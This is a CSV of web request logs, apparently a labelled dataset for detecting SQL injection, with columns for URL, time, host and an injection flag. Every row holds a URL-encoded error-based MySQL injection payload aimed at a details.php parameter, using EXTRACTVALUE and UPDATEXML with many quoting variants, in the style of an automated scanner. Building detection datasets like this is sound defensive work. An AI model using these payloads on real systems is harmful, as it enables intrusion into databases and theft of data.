full_url,event_time,hostname,injection
/details.php?prod=5&type=%3F%22%29%20AS%20fknv%20WHERE%208990%3D8990%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20Fqha,1681395137.330939,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20AS%20JWrf%20WHERE%204115%3D4115%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20WEai,1681395137.334995,192.168.43.6,1
/details.php?prod=5&type=%3F%60%20WHERE%207755%3D7755%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20bjdp,1681395137.340962,192.168.43.6,1
/details.php?prod=5&type=%3F%60%29%20WHERE%207560%3D7560%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20XmXQ,1681395137.345194,192.168.43.6,1
/details.php?prod=5&type=%3F%60%3D%60%3F%60%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%60%3F%60%3D%60%3F,1681395137.34996,192.168.43.6,1
/details.php?prod=5&type=%3F%22%3D%22%3F%22%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%22%3F%22%3D%22%3F,1681395137.354703,192.168.43.6,1
/details.php?prod=5&type=%3F%5D-%28SELECT%200%20WHERE%209464%3D9464%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%29%7C%5B%3F,1681395137.359033,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20IN%20BOOLEAN%20MODE%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%23,1681395137.363692,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20heAW,1681395137.368192,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20WKVF,1681395137.372996,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20pSiX,1681395137.377886,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20tKwb,1681395137.382389,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%285182%3D5182,1681395137.387504,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%289574%3D9574,1681395137.402171,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%284689%3D4689,1681395137.406464,192.168.43.6,1
/details.php?prod=5&type=%3F%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29,1681395137.413492,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%27hpsV%27%3D%27hpsV,1681395137.489797,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%27GGCU%27%3D%27GGCU,1681395137.501891,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%28%27aSns%27%3D%27aSns,1681395137.559991,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%27JvKc%27%3D%27JvKc,1681395137.564648,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%27jQvG%27%20LIKE%20%27jQvG,1681395137.569028,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%27ebCo%27%20LIKE%20%27ebCo,1681395137.57367,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%28%27gRlK%27%20LIKE%20%27gRlK,1681395137.578642,192.168.43.6,1
/details.php?prod=5&type=%3F%25%27%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%27wHDc%25%27%3D%27wHDc,1681395137.584271,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%27AWha%27%20LIKE%20%27AWha,1681395137.588899,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%22ltfU%22%3D%22ltfU,1681395137.594126,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%22qwKK%22%3D%22qwKK,1681395137.599332,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%28%22gnNF%22%3D%22gnNF,1681395137.603613,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%22ACjd%22%3D%22ACjd,1681395137.608736,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%22VgLp%22%20LIKE%20%22VgLp,1681395137.613087,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%22xBno%22%20LIKE%20%22xBno,1681395137.617925,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%28%22YpzX%22%20LIKE%20%22YpzX,1681395137.622647,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%22KTtu%22%20LIKE%20%22KTtu,1681395137.627666,192.168.43.6,1
/details.php?prod=5&type=%3F%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20XNEE,1681395137.633389,192.168.43.6,1
/details.php?prod=5&type=%3F%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%23%20FDQK,1681395137.638192,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20OR%20%27lCat%27%3D%27GalH,1681395137.643671,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20WHERE%209826%3D9826%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20zccZ,1681395137.647915,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20WHERE%206556%3D6556%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20hISF,1681395137.652868,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20WHERE%208337%3D8337%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20fJvF,1681395137.657761,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20WHERE%208659%3D8659%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20vDeW,1681395137.664085,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20WHERE%204410%3D4410%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20Onbk,1681395137.670178,192.168.43.6,1
/details.php?prod=5&type=%3F%20WHERE%201605%3D1605%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20IZEW,1681395137.675436,192.168.43.6,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x6d584a52%20WHERE%205592%3D5592%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%29%7C%7C%27,1681395137.681036,192.168.43.6,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x57624e43%20FROM%20DUAL%20WHERE%209563%3D9563%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%29%7C%7C%27,1681395137.686043,192.168.43.6,1
/details.php?prod=5&type=%3F%27%2B%28SELECT%200x4542716d%20WHERE%203478%3D3478%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%29%2B%27,1681395137.690652,192.168.43.6,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x68516453%20FROM%20DUAL%20WHERE%207984%3D7984%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%29%7C%7C,1681395137.695472,192.168.43.6,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x7a434a6b%20WHERE%201958%3D1958%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%29%7C%7C,1681395137.70145,192.168.43.6,1
/details.php?prod=5&type=%3F%2B%28SELECT%20kpln%20WHERE%206015%3D6015%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%29%2B,1681395137.70685,192.168.43.6,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x4c746654%20WHERE%208343%3D8343%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%29%2B,1681395137.712407,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20AlMw%20WHERE%203967%3D3967%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20hVtQ,1681395137.780536,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20Lcae%20WHERE%208904%3D8904%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20ePWU,1681395137.787346,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%20AS%20enEO%20WHERE%202167%3D2167%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20ZYxO,1681395137.792863,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20AS%20neVe%20WHERE%207946%3D7946%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20Ixzr,1681395137.797179,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20AS%20MHMf%20WHERE%202997%3D2997%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20AyeD,1681395137.80219,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20AS%20vgeu%20WHERE%208792%3D8792%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20vggx,1681395137.807518,192.168.43.6,1
/details.php?prod=5&type=%3F%60%20WHERE%205737%3D5737%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20GLrt,1681395137.813883,192.168.43.6,1
/details.php?prod=5&type=%3F%60%29%20WHERE%205357%3D5357%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29--%20AdbE,1681395137.819015,192.168.43.6,1
/details.php?prod=5&type=%3F%60%3D%60%3F%60%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%60%3F%60%3D%60%3F,1681395137.823192,192.168.43.6,1
/details.php?prod=5&type=%3F%22%3D%22%3F%22%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%22%3F%22%3D%22%3F,1681395137.828003,192.168.43.6,1
/details.php?prod=5&type=%3F%5D-%28SELECT%200%20WHERE%206890%3D6890%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%29%7C%5B%3F,1681395137.832399,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20IN%20BOOLEAN%20MODE%29%20OR%20EXTRACTVALUE%287858%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%287858%3D7858%2C1%29%29%29%2C0x717a626271%29%29%23,1681395137.837111,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20JXVR,1681395137.842554,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20VOyo,1681395137.846955,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20ThWb,1681395137.851725,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20JlFN,1681395137.857591,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%286579%3D6579,1681395137.870243,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%28%283377%3D3377,1681395137.875319,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%28%28%281614%3D1614,1681395137.95663,192.168.43.6,1
/details.php?prod=5&type=%3F%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29,1681395137.970004,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%28%27mEaq%27%3D%27mEaq,1681395137.979428,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%28%28%27kGjG%27%3D%27kGjG,1681395137.984703,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%28%28%28%27vBdr%27%3D%27vBdr,1681395137.989601,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%27AvvI%27%3D%27AvvI,1681395137.996399,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%28%27zcta%27%20LIKE%20%27zcta,1681395138.038053,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%28%28%27sgft%27%20LIKE%20%27sgft,1681395138.043397,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%28%28%28%27URfQ%27%20LIKE%20%27URfQ,1681395138.047972,192.168.43.6,1
/details.php?prod=5&type=%3F%25%27%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%27myLi%25%27%3D%27myLi,1681395138.052677,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%27oidV%27%20LIKE%20%27oidV,1681395138.11281,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%28%22pWJp%22%3D%22pWJp,1681395138.117393,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%28%28%22CBur%22%3D%22CBur,1681395138.1219,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%28%28%28%22flAs%22%3D%22flAs,1681395138.127122,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%22POBp%22%3D%22POBp,1681395138.131434,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%28%22bPsZ%22%20LIKE%20%22bPsZ,1681395138.137077,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%28%28%22RaZd%22%20LIKE%20%22RaZd,1681395138.143896,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%28%28%28%22MtdA%22%20LIKE%20%22MtdA,1681395138.149087,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%22JsGH%22%20LIKE%20%22JsGH,1681395138.153629,192.168.43.6,1
/details.php?prod=5&type=%3F%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20OfcY,1681395138.158602,192.168.43.6,1
/details.php?prod=5&type=%3F%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%23%20Uykv,1681395138.16326,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20OR%20%27hulT%27%3D%27qUGZ,1681395138.167916,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20WHERE%206006%3D6006%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20NDaF,1681395138.172928,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20WHERE%208930%3D8930%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20QBFM,1681395138.177092,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20WHERE%209210%3D9210%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20VXPs,1681395138.182175,192.168.43.6,1
